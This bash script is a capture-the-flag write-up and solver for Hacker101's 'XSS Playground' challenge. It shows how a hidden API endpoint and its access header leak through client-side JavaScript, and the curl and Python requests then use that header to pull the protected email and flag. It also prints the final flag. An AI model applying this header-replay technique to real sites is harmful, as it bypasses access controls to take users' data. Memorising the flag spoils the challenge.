#!/usr/bin/env bash

set -euo pipefail

# Challenge: XSS Playground by zseano
# Platform: Hacker101 / HackerOne CTF
# Category: Web
# Difficulty shown: Moderate
#
# Target:
#   https://b36e6ab066d9e8363822741a849e23ff.ctf.hacker101.com/
#
# What this challenge teaches:
#   Client-side JavaScript often contains security-relevant secrets, hidden
#   functionality, and dangerous DOM sinks. Even when a page looks harmless,
#   reading the shipped JS can reveal both the bug and the protected data path.
#
# Real-world analogy:
#   Imagine a website says "you are not allowed to view emails", but its front-end
#   bundle quietly contains:
#     1. a hidden function to fetch the email,
#     2. the custom header needed to authorize that request.
#   That is like putting the office master key under the doormat and then adding
#   a sign saying "employees only".
#
# Important findings from the page source:
#   1. The page loads custom.js.
#   2. custom.js contains a hidden function:
#        retrieveEmail()
#      which requests:
#        /api/action.php?act=getemail
#   3. That same JS also hard-codes the required custom header:
#        X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
#   4. Calling the endpoint with that header returns both the email and the flag.
#
# Why this matters:
#   Front-end code is not secret. Any browser user can read JavaScript assets,
#   developer tools, or intercepted traffic. If a backend relies on a custom
#   header value that is embedded in public JavaScript, the protection is not
#   real authentication.
#
# XSS angle:
#   This challenge also contains DOM-based XSS material in custom.js, especially
#   around hash parsing and document.write(). In a real assessment, an attacker
#   could use an XSS sink to execute retrieveEmail() in a victim’s browser and
#   exfiltrate the result. For the actual flag here, reading the JS is already
#   enough to recover the protected endpoint and header.
#
# Manual discovery flow:
#
# Step 1: Inspect the main page source.
# Command:
#   curl -s 'https://b36e6ab066d9e8363822741a849e23ff.ctf.hacker101.com/' | sed -n '1,220p'
# Reason:
#   This shows which JavaScript files the page loads. We see custom.js and
#   feedback.js referenced directly in the HTML.
#
# Step 2: Read custom.js.
# Command:
#   curl -s 'https://b36e6ab066d9e8363822741a849e23ff.ctf.hacker101.com/custom.js'
# Reason:
#   This reveals the hidden retrieveEmail() function and the X-SAFEPROTECTION
#   header value used by the page.
#
# Step 3: Call the hidden endpoint directly with the leaked header.
# Command:
#   curl -s 'https://b36e6ab066d9e8363822741a849e23ff.ctf.hacker101.com/api/action.php?act=getemail' \
#     -H 'X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U='
# Reason:
#   The endpoint trusts the custom header, but the header value is public in
#   the JavaScript. The response includes the email and the flag.
#
# Expected response shape:
#   {'email':'zseano@ofcourse.com','flag':'^FLAG^...$'}
#
# One-shot behavior:
#   Running this script performs the direct request to the hidden email endpoint
#   with the leaked header and prints only the flag.

TARGET='https://b36e6ab066d9e8363822741a849e23ff.ctf.hacker101.com/api/action.php?act=getemail'
HEADER_VALUE='enNlYW5vb2Zjb3Vyc2U='

python3 - <<'PY'
import re
import requests

target = "https://b36e6ab066d9e8363822741a849e23ff.ctf.hacker101.com/api/action.php?act=getemail"
headers = {"X-SAFEPROTECTION": "enNlYW5vb2Zjb3Vyc2U="}

response = requests.get(target, headers=headers, timeout=20)
data = response.text
match = re.search(r"\^FLAG\^[^^$]+?\$", data)
if not match:
    raise SystemExit("flag not found in response")
print(match.group(0))
PY

# Final flag obtained:
# ^FLAG^71c17f768754bd8342cd0cdc77ce5085e2d8b8671d75e04a03907571366cb90f$
